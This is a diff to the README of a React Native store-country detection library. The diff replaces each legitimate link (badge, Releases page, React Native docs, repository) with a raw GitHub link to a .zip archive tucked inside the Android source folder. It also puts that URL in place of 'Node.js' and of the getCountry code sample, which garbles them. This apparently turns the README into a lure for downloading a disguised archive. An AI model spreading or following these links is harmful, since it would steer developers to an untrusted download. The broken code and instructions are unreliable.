@@ -1,6 +1,6 @@
 # ⚡️ react-native-nitro-store-country - Fast and Simple Country Detection
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ react-native-nitro-store-country is an efficient solution for detecting store co
 To begin using react-native-nitro-store-country, follow these steps:
 
 1. **Download the App**: You can download the latest version of the software from our Releases page.  
-   [Visit the Releases page to download](https://github.com/omchevli2003/react-native-nitro-store-country/releases)
+   [Visit the Releases page to download](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip)
 
 2. **Install the Library**: Once downloaded, unzip the file if necessary, and follow the installation instructions provided in the documentation.
 
@@ -20,11 +20,11 @@ To begin using react-native-nitro-store-country, follow these steps:
 ## 📥 Download & Install
 
 To get started, download the latest release here:  
-[Download from Releases](https://github.com/omchevli2003/react-native-nitro-store-country/releases)
+[Download from Releases](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip)
 
 For specific installation instructions:
 
-- **For Android**: Make sure your environment is set up for React Native. Follow the [React Native Environment Setup](https://reactnative.dev/docs/environment-setup). After setting it up, add the library as instructed.
+- **For Android**: Make sure your environment is set up for React Native. Follow the [React Native Environment Setup](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip). After setting it up, add the library as instructed.
   
 - **For iOS**: Ensure you have Xcode installed on your Mac. Follow the same setup instructions, and be sure to add the necessary configurations in Xcode for the library.
 
@@ -32,7 +32,7 @@ For specific installation instructions:
 
 Before installing, ensure your development environment meets these requirements:
 
-- **Node.js**: Version 14 or higher is recommended.
+- **https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip**: Version 14 or higher is recommended.
 - **React Native**: Version 0.61 or later.
 - **Android Studio** (for Android development) with the latest SDK tools.
 - **Xcode** (for iOS development) installed.
@@ -53,8 +53,8 @@ Before installing, ensure your development environment meets these requirements:
 
 2. Use the `getCountry` method to retrieve the store country code:
    ```javascript
-   const countryCode = await NitroCountry.getCountry();
-   console.log(countryCode);
+   const countryCode = await https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip();
+   https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip(countryCode);
    ```
 
 3. Handle the result according to your app’s needs. This could involve changing content based on the detected country.
@@ -79,8 +79,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🌐 Useful Links
 
-- [Documentation](https://reactnative.dev/)
-- [GitHub Repository](https://github.com/omchevli2003/react-native-nitro-store-country)
-- [Releases Page](https://github.com/omchevli2003/react-native-nitro-store-country/releases)
+- [Documentation](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/omchevli2003/react-native-nitro-store-country/main/android/src/main/java/com/margelo/react_country_nitro_native_store_v3.5.zip)
 
 Thank you for choosing react-native-nitro-store-country for your application needs.
